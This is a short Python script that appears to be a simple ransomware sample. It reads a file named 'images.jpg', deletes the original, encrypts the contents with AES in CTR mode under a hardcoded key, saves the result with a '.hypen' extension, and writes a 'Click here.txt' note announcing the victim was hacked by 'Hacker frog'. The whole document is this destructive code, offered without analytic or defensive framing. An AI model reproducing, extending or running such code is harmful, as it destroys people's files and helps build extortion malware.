import os
import binascii
import pyaes


arquivo= "images.jpg"
novo_arquivo=arquivo + ".hypen"
key = b"sadftgbsdftghjut"



file = open(arquivo,"rb")
file_data=file.read()
file.close()
os.remove(arquivo)



aes = pyaes.AESModeOfOperationCTR(key)
crypto_data = aes.encrypt(file_data)
crypto_data_hex = binascii.hexlify(crypto_data)



new_file = open(novo_arquivo,"wb")
new_file.write(crypto_data)
new_file.close()



texto = b"You just got hacked \n By: Hacker frog"

texto
arquivo_texto = open("Click here.txt","wb")
arquivo_texto.write(texto)
arquivo_texto.close()